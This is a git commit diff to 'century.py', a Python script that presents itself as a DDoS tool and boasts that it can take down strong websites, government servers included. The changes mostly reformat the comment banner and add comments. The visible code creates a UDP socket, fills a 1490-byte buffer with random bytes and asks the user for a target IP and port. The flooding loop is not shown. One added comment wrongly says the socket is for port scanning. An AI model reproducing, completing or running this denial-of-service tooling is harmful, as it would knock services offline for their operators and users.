b3156b6baba6cdb537055aac16c36a7a803dc79c
Ghouler <96554099+Ghoul3r@users.noreply.github.com>
2022-03-25 10:01:48 -0400

    Update century.py

--- century.py
+++ century.py
@@ -1,39 +1,40 @@
-# ----------------------------------------------------------------------------------------------|
-# Century - iDDoS Tool                                                                          |
-#                                                                                               |
-# DDoSing is the most massive type of web and server attack                                     |
-# This tool can takedown strong webstites including goverment servers as well                   |
-#                                                                                               |
-#                                                                                               |
-# author : Ghoul3r , version 1.0                                                                |
-# ----------------------------------------------------------------------------------------------|
-# Copyright (c) 2022 Ghoul3r                                                                    |
-# ----------------------------------------------------------------------------------------------|
-# Permission is hereby granted, free of charge, to any person obtaining a copy                  |
-# of this software and associated documentation files (the "Software"), to deal                 |
-# in the Software without restriction, including without limitation the rights                  |
-# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell                     |
-#copies of the Software, and to permit persons to whom the Software is                          |
-#furnished to do so, subject to the following conditions:                                       |
-#                                                                                               |
-# The above copyright notice and this permission notice shall be included in all                |
-# copies or substantial portions of the Software.                                               |
-# ----------------------------------------------------------------------------------------------|
-# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR                    |
-# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,                      |
-# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE                   |
-# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER                        |
-# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,                 |
-# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE                 |
-# SOFTWARE.                                                                                     |
-# ----------------------------------------------------------------------------------------------|
+# |-----------------------------------------------------------------------------------------------|
+# | Century - iDDoS Tool                                                                          |
+# |                                                                                               |
+# | DDoSing is the most massive type of web and server attack                                     |
+# | This tool can takedown strong webstites including goverment servers as well                   |
+# |                                                                                               |
+# |                                                                                               |
+# | author : Ghoul3r , version 1.0                                                                |
+# |-----------------------------------------------------------------------------------------------|
+# | Copyright (c) 2022 Ghoul3r                                                                    |
+# |-----------------------------------------------------------------------------------------------|
+# | Permission is hereby granted, free of charge, to any person obtaining a copy                  |
+# | of this software and associated documentation files (the "Software"), to deal                 |
+# | in the Software without restriction, including without limitation the rights                  |
+# | to use, copy, modify, merge, publish, distribute, sublicense, and/or sell                     |
+# | copies of the Software, and to permit persons to whom the Software is                         |
+# | furnished to do so, subject to the following conditions:                                      |
+# |                                                                                               |
+# | The above copyright notice and this permission notice shall be included in all                |
+# | copies or substantial portions of the Software.                                               |
+# |-----------------------------------------------------------------------------------------------|
+# | THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR                    |
+# | IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,                      |
+# | FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE                   |
+# | AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER                        |
+# | LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,                 |
+# | OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE                 |
+# | SOFTWARE.                                                                                     |
+# |-----------------------------------------------------------------------------------------------|
 
+# Importing modules
 import sys
 import os
 import time
 import socket
 import random
-#Code Time
+# Coding time logic
 from datetime import datetime
 now = datetime.now()
 hour = now.hour
@@ -42,19 +43,21 @@ day = now.day
 month = now.month
 year = now.year
 
-##############
+# Defining sockets for computer to scan ports
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
-#############
 
+# Startign terminal UI
 os.system("clear")
 os.system("figlet Century - DDoS")
 print "Author   : Ghoul3r"
 print "Github   : https://github.com/Ghoul3r"
 
+# Defining ip variables
 ip = raw_input("IP Target: ")
 port = input("Port: ")
 
+# Preparing progressbar
 os.system("clear")
 def progressbar(it, prefix="", size=60, file=sys.stdout):
     count = len(it)
